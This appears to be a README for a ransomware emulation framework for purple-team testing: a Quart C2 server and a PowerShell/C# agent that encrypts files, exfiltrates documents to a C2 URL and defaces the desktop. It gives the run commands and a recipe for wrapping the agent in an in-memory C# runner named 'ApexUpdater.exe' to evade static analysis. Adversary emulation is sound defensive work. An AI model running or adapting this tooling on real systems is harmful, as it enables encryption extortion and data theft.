```markdown

 █████╗ ██████╗ ███████╗██╗  ██╗    ██████╗ ██████╗  ██████╗ 
██╔══██╗██╔══██╗██╔════╝╚██╗██╔╝     ██╔══██╗██╔══██╗██╔═══██╗
███████║██████╔╝█████╗   ╚███╔╝      ██████╔╝██████╔╝██║   ██║
██╔══██║██╔═══╝ ██╔══╝   ██╔██╗      ██╔═══╝ ██╔══██╗██║   ██║
██║  ██║██║     ███████╗██╔╝ ██╗     ██║     ██║  ██║╚██████╔╝
╚═╝  ╚═╝╚═╝     ╚══════╝╚═╝  ╚═╝     ╚═╝     ╚═╝  ╚═╝ ╚═════╝ 

       ⚡ APEX PRO: RANSOMWARE EMULATION FRAMEWORK
     [ ADVERSARY EMULATION & PURPLE TEAM FRAMEWORK ]

```

**Apex Pro is a high-fidelity adversary emulation tool designed to replicate the behaviors of modern ransomware families (e.g., LockBit, Conti).** It provides a safe, controlled environment to validate detection pipelines, EDR efficacy, and Incident Response (IR) readiness.

---

### ⚠️ DISCLAIMER

**For Educational and Authorized Security Testing Purposes Only.**

The use of this framework for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state, and federal laws. The authors assume no liability and are not responsible for any data loss, system damage, legal consequences, or misuse caused by this program. By using this software, you agree to operate within the legal boundaries of your jurisdiction.

---

## 🚀 Project Status: In Development

* [x] AES-256-CBC Per-File Encryption
* [x] Asynchronous Python C2 Backend (Quart/aiosqlite)
* [x] Automated Metadata Exfiltration (TLS 1.2+)
* [x] **Data Theft Module (T1041):** Automated discovery and exfiltration
* [x] Persistence & Lateral Propagation Modules
* [x] Canary Tripwire Real-time Alerts
* [ ] Advanced EDR Evasion (In Progress)

---

## 🛠 Project Structure

### 🛰 The Apex C2 (Command & Control)

The central hub for persistent victim tracking and telemetry analysis.

* **Features:**
* **Multi-Victim Support:** Scalable asynchronous backend utilizing Quart.
* **Forensic Reporting:** Automated professional PDF generation via `apex_report.py`.
* **Secure Comms:** Metadata manifests tunneled through encrypted HTTPS.



### 💻 The Apex Agent (PowerShell/C#)

The primary execution module designed for high-fidelity impact simulation.

* **Features:**
* **Impact:** Wallpaper hijacking, ransom notes, and UI defacement (T1491).
* **Data Theft (T1041):** Discovery and exfiltration of `.xlsx`, `.pdf`, and `.docx` via Base64 streams.
* **Stealth:** C# wrapper option to execute PowerShell in-memory to bypass static analysis.



---

## ⚙️ Setup & Execution

### 1. Server Setup (Arch Linux)

Ensure your `.pem` files are in the server directory (they are added to the `.gitignore`).

```bash
# Install Dependencies
pip install -r requirements.txt

# Generate Certificates
openssl req -x509 -newkey rsa:4096 -keyout apex_key.pem -out apex_cert.pem -sha256 -days 365 -nodes -subj "/CN=localhost"

# Start C2 Listener
sudo python3 c2_server.py

```

### 2. Client Preparation & Execution

Generate victim data and launch the simulation phase.

```powershell
# [B] Lab Preparation: Generate dummy data
.\GenerateVictimData.ps1 -RootPath "C:\SimulationData"

# [C] Execution Phase 1: Impact (Theft, Encryption & Exfiltration)
.\ApexSim.ps1 -Mode Encrypt -C2Url "https://<YOUR_C2_IP>/api/v1/telemetry" -TargetPath "C:\SimulationData"

# [C] Execution Phase 2: Recovery (Decryption)
.\ApexSim.ps1 -Mode Decrypt -TargetPath "C:\SimulationData"

```

### 3. Advanced Execution (C# Wrapper Compilation)

To bypass static analysis and execution policies, the agent is wrapped in a C# runner that executes in memory.

**Step A: Encode the Script (Linux)**

```bash
base64 -w 0 ApexSim.ps1 > b64_script.txt

```

**Step B: Prepare and Compile (Windows)**

1. Copy the string from `b64_script.txt` into the `encodedScript` variable in `ApexRunner.cs`.
2. Locate `csc.exe` (usually at `C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe`).
3. Locate `System.Management.Automation.dll` (usually in the GAC or assembly folder).
4. Compile the binary:

```powershell
csc.exe /target:winexe /reference:System.Management.Automation.dll /out:ApexUpdater.exe ApexRunner.cs

```

---

## 🛡 Incident Response (IR) Exercise Template

**Simulation ID:** APEX-2026-### | **Target Host:** [Hostname]

| Phase | Technique | Alert Triggered? | TTD (Min) |
| --- | --- | --- | --- |
| **Persistence** | T1547.001 | [YES/NO] | [ ] |
| **Lateral Movement** | T1135 | [YES/NO] | [ ] |
| **Data Theft** | T1041 | [YES/NO] | [ ] |
| **Exfiltration** | T1011 | [YES/NO] | [ ] |
| **Canary Trip** | Honey-pot | [YES/NO] | [ ] |
| **Encryption** | T1486 | [YES/NO] | [ ] |
| **Internal Defacement** | T1491.001 | [YES/NO] | [ ] |
| **Obfuscation** | T1027 | [YES/NO] | [ ] |
| **Execution** | T1059.001 | [YES/NO] | [ ] |

> **Note:** All simulations include a standardized Incident Response (IR) Exercise Template to help Blue Teams measure Mean-Time-to-Detection (MTTD) and Alert effectiveness across every stage of the kill chain.

---

## 🔒 Rules of Engagement & Safety

1. **Targeting:** Hard-code `$TargetPath` to an isolated sandbox.
2. **Networking:** Use Host-Only/Internal VM networking ONLY.
3. **Restoration:** Run `.\ApexSim.ps1 -Mode Decrypt` to revert changes.
4. **C2 Security:** Use the AES shared key to secure the agent.

---